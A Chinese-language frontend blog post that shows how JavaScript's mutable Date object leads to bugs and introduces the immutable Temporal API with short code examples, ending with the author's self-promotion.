<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> today = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(today.<span class="hljs-title function_">toDateString</span>()); <span class="hljs-comment">// Fri Jan 09 2026</span>

<span class="hljs-comment">// 我想算一下明天是几号</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">addDay</span> = (<span class="hljs-params">theDate</span>) =&gt; {
  theDate.<span class="hljs-title function_">setDate</span>(theDate.<span class="hljs-title function_">getDate</span>() + <span class="hljs-number">1</span>);
  <span class="hljs-keyword">return</span> theDate;
};

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`明天是 <span class="hljs-subst">${addDay(today).toLocaleDateString()}</span>。`</span>);
<span class="hljs-comment">// 明天是 2026/1/10。</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`今天是 <span class="hljs-subst">${today.toLocaleDateString()}</span>。`</span>);
<span class="hljs-comment">// 今天是 2026/1/10。</span>

<span class="hljs-comment">// 等等，今天怎么也变成明天了？！</span>
</code></pre>
<p>当然这是可以解释的：</p>
<p>因为 <code>today</code> 就像一个地址，指向内存里的某个位置。当你把 today 传给函数时，函数拿到的也是这个地址。所以当函数修改日期时，原来的 today 也被改了。</p>
<p><strong>但这种设计违反了一个基本常识：日期应该是固定的。</strong>“2026 年 1 月 10 日”就是“2026 年 1 月 10 日”，不应该因为你拿它做了个计算，它自己就变了。</p>
<p>所以 Date 真的很糟糕。实际上，它就是挂羊头卖狗肉，它叫做 Date，表示日期，实际上，它是时间。</p>
<p>在内部，Date 是以数值形式存储的，这就是我们熟悉的以 1000 毫秒为单位的时间戳。</p>
<p>时间当然包含日期，你可以从时间中推断出日期，但这多少有点恶心了。</p>
<p><strong>Java 早在 1997 年就弃用了其 Date 类，而 JavaScript 的 Date 类仅仅在几年后就问世了；与此同时，我们却一直被这个烂摊子困扰着。</strong></p>
<p>正如你目前所见，它在解析日期方面极其不稳定。它除了本地时间和格林威治标准时间 (GMT) 之外，对其他时区一无所知。而且，Date 类只支持公历。它完全不理解夏令时的概念。当然最糟糕的还是它的可变的，这直接让他偏离了时间的本质。</p>
<p>所有这些缺陷使得使用第三方库来解决这些问题变得异常普遍，其中一些库体积庞大，这种性能损耗已经对网络造成了切实可衡量的损害。</p>
<h2 data-id="heading-2">3. Temporal 才是未来</h2>
<p>幸运的是，Date 即将彻底退出历史舞台。</p>
<p>当然这样说，还是有点夸张了。</p>
<p>实际上是它会一直存在，但如果可以避免，你最好不要再用它了。</p>
<p>因为我们会有一个完全取代 Date 的对象 —— Temporal。</p>
<p>部分同学可能对 Temporal 这个单词不太熟悉，实际上，它的意思就是“时间”，你可以理解为它是一个更专业的词汇：</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c478354123a4214853e034b8c02423c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535532&amp;x-signature=7zkUgKz23CCjqWyyF%2Fi5aBlT07Q%3D" alt="" loading="lazy"/></p>
<p>与 Date 不同，Temporal 不是构造函数，它是一个命名空间对象——一个由静态属性和方法组成的普通对象，就像 Math 对象一样：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Temporal</span>);
<span class="hljs-comment">/* Result (expanded):
Temporal { … }
  Duration: function Duration()
  Instant: function Instant()
  Now: Temporal.Now { … }
  PlainDate: function PlainDate()
  PlainDateTime: function PlainDateTime()
  PlainMonthDay: function PlainMonthDay()
  PlainTime: function PlainTime()
  PlainYearMonth: function PlainYearMonth()
  ZonedDateTime: function ZonedDateTime()
  Symbol(Symbol.toStringTag): "Temporal"
*/</span>
</code></pre>
<p>Temporal 包含的类和命名空间对象允许你计算两个时间点之间的持续时间、表示一个时间点（无论是否具有时区信息）、通过 Now 属性访问当前时间点等。</p>
<p>如果我们要获取当前时间：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Temporal</span>.<span class="hljs-property">Now</span>.<span class="hljs-title function_">plainDateISO</span>());
<span class="hljs-comment">/* Result (expanded):
Temporal.PlainDate 2025-12-31
  &lt;prototype&gt;: Object { … }
*/</span>
</code></pre>
<p>该方法返回的是当前时区的今天日期。</p>
<p>Temporal 还能支持时区：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> date = <span class="hljs-title class_">Temporal</span>.<span class="hljs-property">Now</span>.<span class="hljs-title function_">plainDateISO</span>();

<span class="hljs-comment">// 指定这个日期在伦敦时区</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(date.<span class="hljs-title function_">toZonedDateTime</span>(<span class="hljs-string">"Europe/London"</span>));
</code></pre>
<p>Temporal 还可以计算日期差：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> today = <span class="hljs-title class_">Temporal</span>.<span class="hljs-property">Now</span>.<span class="hljs-title function_">plainDateISO</span>();
<span class="hljs-keyword">const</span> jsShipped = <span class="hljs-title class_">Temporal</span>.<span class="hljs-property">PlainDate</span>.<span class="hljs-title function_">from</span>(<span class="hljs-string">"1995-12-04"</span>); <span class="hljs-comment">// JavaScript 发布日期</span>
<span class="hljs-keyword">const</span> difference = today.<span class="hljs-title function_">since</span>(jsShipped, { <span class="hljs-attr">largestUnit</span>: <span class="hljs-string">"year"</span> });

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`JavaScript 已经存在了 <span class="hljs-subst">${difference.years}</span> 年 <span class="hljs-subst">${difference.months}</span> 个月零 <span class="hljs-subst">${difference.days}</span> 天。`</span>);
</code></pre>
<p>各种时间操作也会更加直观：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> today = <span class="hljs-title class_">Temporal</span>.<span class="hljs-property">Now</span>.<span class="hljs-title function_">plainDateISO</span>();

<span class="hljs-comment">// 加一天</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(today.<span class="hljs-title function_">add</span>({ <span class="hljs-attr">days</span>: <span class="hljs-number">1</span> }));

<span class="hljs-comment">// 加一个月零一天，再减两年——可以链式操作</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(today.<span class="hljs-title function_">add</span>({ <span class="hljs-attr">months</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">days</span>: <span class="hljs-number">1</span> }).<span class="hljs-title function_">subtract</span>({ <span class="hljs-attr">years</span>: <span class="hljs-number">2</span> }));

<span class="hljs-comment">// 看，多清楚！</span>
</code></pre>
<p>当然，更重要的是，日期不会被意外修改</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> today = <span class="hljs-title class_">Temporal</span>.<span class="hljs-property">Now</span>.<span class="hljs-title function_">plainDateISO</span>();

<span class="hljs-comment">// 计算明天的日期</span>
<span class="hljs-keyword">const</span> tomorrow = today.<span class="hljs-title function_">add</span>({ <span class="hljs-attr">days</span>: <span class="hljs-number">1</span> });

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`今天是 <span class="hljs-subst">${today}</span>。`</span>); <span class="hljs-comment">// 2025-12-31</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`明天是 <span class="hljs-subst">${tomorrow}</span>。`</span>); <span class="hljs-comment">// 2026-01-01</span>

<span class="hljs-comment">// 今天还是今天，完美！</span>
</code></pre>
<p><code>add</code> 方法会返回一个新的日期对象，而不是修改原来的。就像你复印了一份日历，在复印件上写字，原件不会被弄脏。</p>
<h2 data-id="heading-3">4. 什么时候能用？</h2>
<p>好消息：最新版的 Chrome 和 Firefox 已经支持了！</p>
<p>坏消息：它还在“实验阶段”，这意味着具体用法可能还会微调，但大方向已定。</p>
<p>我们终于要和 Date 的噩梦说再见了。</p>
<p>我是冴羽，10 年笔耕不辍，专注前端领域，更新了 10+ 系列、300+ 篇原创技术文章，翻译过 Svelte、Solid.js、TypeScript 文档，著有小册《Next.js 开发指南》、《Svelte 开发指南》、《Astro 实战指南》。</p>
<p>欢迎围观我的“<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2F" target="_blank" title="https://yayujs.com/" ref="nofollow noopener noreferrer">网页版朋友圈</a>”，关注我的公众号：<strong>冴羽（或搜索 yayujs）</strong> ，每天分享前端知识、AI 干货。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>